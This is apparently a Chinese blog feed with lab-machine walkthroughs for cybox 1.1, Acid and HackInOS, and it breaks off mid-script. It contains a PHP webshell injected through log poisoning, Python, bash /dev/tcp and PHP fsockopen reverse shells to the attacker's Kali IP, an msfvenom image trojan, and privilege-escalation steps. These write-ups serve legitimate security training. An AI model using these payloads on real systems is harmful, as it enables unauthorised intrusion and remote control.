    <content type="html"><![CDATA[<h3 id="cybox-1-1靶机练习"><a href="#cybox-1-1靶机练习" class="headerlink" title="cybox:1.1靶机练习"></a>cybox:1.1靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.141</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><h5 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>下图中192.168.1.1为VMnet8网卡地址，1.3位网关地址，1.137为kali地址，因此判断目标靶机地址为192.168.1.141</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210102234570.png" alt="image-20210210102234570"></p><h5 id="端口服务扫描："><a href="#端口服务扫描：" class="headerlink" title="端口服务扫描："></a>端口服务扫描：</h5><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210113920614.png" alt="image-20210210113920614" style="zoom:67%;" /><p>靶机开启了80和443端口，访问一下看看</p><p>直接访问ip后是一个web页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114127375.png" alt="image-20210210114127375"></p><p>拖到页面最下方可以看到一个域名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114235781.png" alt="image-20210210114235781"></p><h5 id="爆破目录："><a href="#爆破目录：" class="headerlink" title="爆破目录："></a>爆破目录：</h5><p>爆破一下目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.141&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114345084.png" alt="image-20210210114345084" style="zoom: 80%;" /><p>同时也使用dirbuster爆破一下详细页面，以取得更多的信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115418915.png" alt="image-20210210115418915"></p><p>依次访问dirb爆出的目录，发现assets目录下存放了些css、js文件</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210114945379.png" alt="image-20210210114945379" style="zoom: 67%;" /><p>/cgi/bin目录无访问权限，/phpadmin目录只允许本地访问</p><p>dirbuster爆破结果也出来了，与dirb扫出的结果相差不大，此时并没有发现到什么有价值的页面。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115351005.png" alt="image-20210210115351005"></p><p>此时我们甚至都没有找到真正提供服务的web页面，我们扫描端口时可以看到目标机器开放了ftp服务，还开放了pop3、imap，还提供邮件服务，很明显目标机器有一个较复杂的网站提供服务，但我们的扫描结果并不相符，说明爆破姿势不对</p><p>之前访问首页的时候看到了一个域名cybox.company，我们将其添加进hosts文件，尝试再次扫描一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210115848593.png" alt="image-20210210115848593"></p><p>这次我们使用gobuster进行扫描，gobuster是一款基于go语言的目录/文件和DNS爆破工具，可以对目录、文件、DNS和VHost等对象进行暴力破解攻击，下载链接<a href="https://github.com/OJ/gobuster%EF%BC%8Ckali%E4%B8%8B%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5**apt-get">https://github.com/OJ/gobuster，kali下可以直接**apt-get</a> install gobuster**进行安装</p><p>扫描后，可以看到，有了我们之前并未爆破出的页面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -u http:<span class="hljs-regexp">//</span>cybox.company<span class="hljs-regexp">/ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210120618851.png" alt="image-20210210120618851"></p><p>依次访问各页面</p><p>dev.cybox.company是一个PHPinfo</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210122858686.png" alt="image-20210210122858686"></p><p>ftp.cybox.company是一个ftp页面，目测实现文件传输功能，需要验证用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123135118.png" alt="image-20210210123135118"></p><p>webmail.cybox.company是一个邮箱登录页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210124443912.png" alt="image-20210210124443912"></p><p>register.cybox.company是一个创建用户页面，尝试创建后直接显示创建成功，也并没有提示输入密码等信息，直接给了一个与用户名相同的密码，暂时不知道是创建了什么用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210125804934.png" alt="image-20210210125804934"></p><p>monitor.cybox.company访问后跳转到一个登录页面，下面两个链接可以跳转到一个注册页面，以及一个密码找回</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210123613774.png" alt="image-20210210123613774"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>在上面这个页面，注册一个用户登录试一下</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210131944537.png" alt="image-20210210131944537" style="zoom:67%;" /><p>登录后发现并没有什么实际功能，只有一个创建条目记录时间的，不知道有什么作用</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210132233531.png" alt="image-20210210132233531"></p><p>这里退出登录，试一下未注册用户，发现不存在的用户登录会直接提示用户不存在，这里可以试一下有无admin用户</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210134819545.png" alt="image-20210210134819545" style="zoom:67%;" /><p>尝试猜解管理员的用户名，因为登录页面提供密码修改，可以试试能不能越权修改密码，此处发现存在一个<a href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#x40;&#99;&#121;&#x62;&#x6f;&#x78;&#46;&#99;&#111;&#x6d;&#x70;&#x61;&#110;&#x79;">&#x61;&#100;&#109;&#x69;&#110;&#x40;&#99;&#121;&#x62;&#x6f;&#x78;&#46;&#99;&#111;&#x6d;&#x70;&#x61;&#110;&#x79;</a>，显示密码错误，并没有显示用户不存在，先记下，一会看看能不能改</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222525468.png" alt="image-20210210222525468" style="zoom:67%;" /><p>点击忘记密码，会跳转到一个发送链接的页面，这里是将修改链接发送到邮箱了，应该就是我们刚刚看到的那个邮箱的登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210135357234.png" alt="image-20210210135357234"></p><p>到邮箱登录页面webmail，登录，发现无法登录，一直显示密码用户名不匹配，说明两边的用户不互通，但我们这时还有一个之前的register.cybox.company/目录，用它创建一个同名用户aaa</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222010198.png" alt="image-20210210222010198" style="zoom:67%;" /><p>之后再到webmail登录，登录成功，可以看到我们之前接收到的修改密码的邮件，里面有个修改链接</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222214774.png" style="zoom: 50%;" /><p>点进去，跳转到一个修改密码页面，我们用burp抓下包，把邮箱改成admin的，看看能不能通过改包来越权修改admin用户的密码</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210222942625.png" alt="image-20210210222942625" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223046506.png" alt="image-20210210223046506"></p><p>点击放包，直接跳转回了登录页面，尝试登录admin用户，登录成功，看来并没有什么验证</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223332763.png" alt="image-20210210223332763" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223359734.png" alt="image-20210210223359734"></p><p>点进Admin panel，看一下管理页面，结果，开发中</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210223827281.png" alt="image-20210210223827281" style="zoom:67%;" /><p>到这里又断了，进入到网站的后台结果开发中。。。</p><p>但是方法总比困难多，右键查看页面代码，可以看到，这里包含进来一个php页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224124818.png" alt="image-20210210224124818"></p><p>我们可以尝试文件包含，包含一个/etc/passwd文件测试一下，包含成功，此处存在文件包含漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210210224656944.png" alt="image-20210210224656944"></p><p>然后咱们可以通过日志文件反弹一个shell，apache的日志目录为/opt/bitnami/apache2/logs/，请求日志文件为access_log，错误日志文件为error_log，我们包含请求日志看一下，可以看到，这是ftp页面的请求日志</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212173236662.png" alt="image-20210212173236662"></p><p>我们转到ftp页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200452500.png" alt="image-20210212200452500"></p><p>打开burp抓包，刷新页面，拦一个包下来，User-Agent改成cmd命令的php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212200557510.png" alt="image-20210212200557510"></p><p>发包，然后测试一下，测试成功，没有问题</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212201117351.png" alt="image-20210212201117351"></p><p>制作反弹shell</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&#x27;192.168.1.137&#x27;</span>,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-i&#x27;</span>]);&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203519286.png" alt="image-20210212203519286"></p><p>kali端监听443端口（这里选取443是因为经测试此靶机只允许通往部分端口的数据包进出）</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203720362.png" alt="image-20210212203720362"></p><p>监听好端口后，web页面敲击回车，成功反弹shell，拿到了一个低权限的shell</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212203808874.png" alt="image-20210212203808874" style="zoom:80%;" /><h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h4><p>首先查找有s权限的文件，只看非系统文件，此处需要审计代码，可以看到，在/opt目录下有一个registerlauncher</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212213925216.png" alt="image-20210212213925216" style="zoom:80%;" /><p>在我们查看此文件内容时可以发现它调用了另一个/opt目录下的文件register，注意此处直接用cat查看文件会乱码，需要用strings转化字符串</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>s registerlauncher<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212214029876.png" alt="image-20210212214029876" style="zoom:80%;" /><p>在查看register文件内容，发现这是一个可以创建用户的文件</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212220738362.png" alt="image-20210212220738362" style="zoom: 80%;" /><p>实际就是实现了那个register页面的功能，测试之前创建的aaa用户，此处可以登录</p><p>首先取得一个交互shell</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>然后尝试登录aaa，成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212222901048.png" alt="image-20210212222901048"></p><p>试一下能不能切换root，失败，提示我们aaa不再sudoers文件中</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212223159058.png" alt="image-20210212223159058"></p><p>另外此处我们无权限查看sudoers文件，但应该是有用户持有切换权限的，这里就需要试了，所幸并不难猜，用户名起为sudo即可</p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224130623.png" alt="image-20210212224130623" style="zoom:67%;" /><p>创建完之后切换用户sudo，即可切换root用户，至此提权完毕</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224253887.png" alt="image-20210212224253887"></p><p>在root的家目录下可以看到一个root.txt，查看一下，应该是个flag</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210212224445648.png" alt="image-20210212224445648"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/yutianovo/article/details/111687112">https://blog.csdn.net/yutianovo/article/details/111687112</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Acid靶机练习</title>
    <link href="/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/06/Acid%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="Acid靶机练习"><a href="#Acid靶机练习" class="headerlink" title="Acid靶机练习"></a>Acid靶机练习</h3><h4 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h4><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.140</p><p>kali linux ip：192.168.1.137</p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>主机发现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>下图中192.168.1.1为VMnet8网卡地址，1.3为网关地址，1.137为攻击机地址，因此推测目标主机地址为192.168.1.140</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210203223609124.png" alt="image-20210203223609124"></p><p>端口扫描：</p><p>可以看到目标机器使用了Apache作为中间件，开放了33447端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.140</span> -sV<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204093237048.png" alt="image-20210204093237048"></p><p>访问一下看看，发现是一个静态页面，扫描一下目录看看</p><p>首先用dirb扫一下，已经用了big的字典，但扫到的目录条目还是很少</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204100917676.png" alt="image-20210204100917676"></p><p>再用dirbuster爆破目录</p><p>选好字典，爆破目录选择根目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204101135047.png"></p><p>点击start开始爆破，得到了比较全面的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204202104586.png" alt="image-20210204202104586"></p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>访问查看各条目，challenge目录下是一个登录页面，先放着不管</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204202215238.png" alt="image-20210204202215238"></p><p>一路向下访问，到cake.php条目下的时候,可以看到标签页上出现了一个目录名Magic_Box，结合页面上的话，另外页面叫cake.php，这个目录应该是有用的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204204000254.png" alt="image-20210204204000254"></p><p>再次爆破这个Magic_Box目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204222202012.png" alt="image-20210204222202012"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204224446448.png" alt="image-20210204224446448"></p><p>得到的结果中有一个command.php，访问后发现是一个可以执行ping命令的页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204224626144.png" alt="image-20210204224626144"></p><p>测试命令注入，提交参数后并没有回显信息，burp抓包看一下，果然，信息是有的，只是没有直接回显到页面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204225054147.png" alt="image-20210204225054147"></p><p>用ifconfig测试一下，发现果然存在命令注入</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210204225212133.png" alt="image-20210204225212133"></p><p>尝试反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.1.137</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205175956076.png" alt="image-20210205175956076"></p><p>kali端监听4444端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205173317428.png" alt="image-20210205173317428"></p><p>未果，反弹失败，尝试转url编码，依旧反弹失败</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205175147349.png" alt="image-20210205175147349"></p><p>尝试其他的反弹方式</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">;php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;192.168.1.137&quot;</span>,<span class="hljs-number">4444</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure><p>反弹成功</p><h4 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h4><p>首先查看passwd文件，看一下用户</p><p>着重关注acid、saman两个用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200204389.png" alt="image-20210205200204389"></p><p>查看一下这两个用户的文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -user saman 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200354607.png" alt="image-20210205200354607"></p><p>find / -user acid 2&gt;/dev/null</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205200506712.png" alt="image-20210205200506712"></p><p>在acid的文件中可以看到一个抓包文件hunt.pcapng，显得格格不入，我们通过ssh把它复制下来，这里因为kali linux为保证安全性，ssh是默认禁止连接的，需要修改配置文件，这里我直接使用了另外一台centos来接收文件，ip为192.168.1.131</p><p>首先取得一个交互shell，以进行下一步操作，在原本shell中输入以下命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>然后使用命令scp来复制传输文件，如图传输成功</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp /sbin/raw_vs_isi/hint.pcapng root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.1</span>.<span class="hljs-number">131</span><span class="hljs-symbol">:/root/hint</span>.pcapng<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205201641880.png" alt="image-20210205201641880"></p><p>拿到抓包文件后，用wireshark打开</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205201844205.png" alt="image-20210205201844205"></p><p>逐包查看，未果，可以分数据包种类跟踪流，查看数据包信息</p><p>追踪tcp流时，可以看到saman用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205202141370.png" alt="image-20210205202141370"></p><p>我们切换到此用户saman，成功切换，之后再尝试用户saman切换root，发现有权限，切换成功，提权至root</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210205202547170.png" alt="image-20210205202547170"></p><p>参考文章：<a href="https://www.freebuf.com/column/200518.html">https://www.freebuf.com/column/200518.html</a></p><p>​                    </p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackInOS靶机练习</title>
    <link href="/2021/04/29/HackInOS%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/04/29/HackInOS%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="HackInOS靶机练习"><a href="#HackInOS靶机练习" class="headerlink" title="HackInOS靶机练习"></a>HackInOS靶机练习</h2><h3 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h3><p>网络结构由VMware虚拟机及物理机组成</p><p>靶机hackinOS：192.168.1.</p><p>Kali:192.168.1.132/24</p><p>物理机</p><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><h4 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h4><p>Nmap扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>    <br></code></pre></td></tr></table></figure><p>此处192.168.1.1为VMnet1网卡地址，1.3为网关地址，1.137为kali的地址，判断靶机地址为192.168.1.136(这里因为原图在保存过程中丢失了，所以我重新扫描了一下放了张图，时间跟后面对不上，但是不妨碍，地址都是一样的)  </p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113201528888.png" alt="image-20210113201528888">          </p><h4 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h4><p>可以看到除了22端口，还开放了8000端口:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV <span class="hljs-number">192.168.1.136</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113104409516.png" alt="image-20210113104409516"></p><h3 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h3><p>访问8000端口：</p><p>可以看到一个web界面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113104422944.png" alt="image-20210113104422944"></p><p>访问robots.txt，可以看到提示了我们一个文件上传页面</p><p>注：robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（爬虫），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113104444259.png" alt="image-20210113104444259"></p><p>打开这个页面瞅瞅：    </p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113104457566.png" alt="image-20210113104457566"></p><p>右键查看源代码，拖到最底下，看到给了一个github链接</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113134252755.png" alt="image-20210113134252755"></p><p>转到这个GitHub页面，可以看到人家给了页面源码：可以上传文件，过滤了mime类型，仅允许png和gif格式</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113203046167.png" alt="image-20210113203046167"></p><p>生成了一个1-100随机数，添加在文件尾部，用md5加密后作为新文件名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113203151096.png" alt="image-20210113203151096"></p><p> 这里我们可以上传个木马，接收反弹shell，先制作一个反弹shell的php木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.137 <span class="hljs-attribute">lport</span>=4444 -f<span class="hljs-built_in"> raw </span>&gt; 1.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113200422878.png" alt="image-20210113200422878"></p><p>生成木马如下图，ip地址为kali的ip，端口号4444为kali要监听的端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113200652237.png" alt="image-20210113200652237"></p><p>然后加到某一图片中，生成图片马</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113203853643.png" alt="image-20210113203853643"></p><p>记事本打开此图片，可以看到我们1.php中的代码已经加到了图片最后面</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113204004374.png" alt="image-20210113204004374"></p><p>图片马生成成功，接下来上传上去，将数据包用burp拦截下来，需要修改一下文件名后缀为php，不然到时候没法用</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113204211026.png" alt="image-20210113204211026"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210118195423279.png" alt="image-20210118195423279"></p><p>如上图已经可以看到上传成功，还提示了我们存放的目录位置</p><p>在kali端监听端口：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//hackinos/image-20210113213243804.png" alt="image-20210113213243804"></p><p>这里因为目标主机在存储上传过来的图片时，会在文件名尾部加一个1-100的随机数，然后对其进行md5加密，再生成新的文件名，我们无法直接访问，需要借助工具对目标路径进行爆破</p><p>这里首先运行一个python脚本a.py，生成字典zd1.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 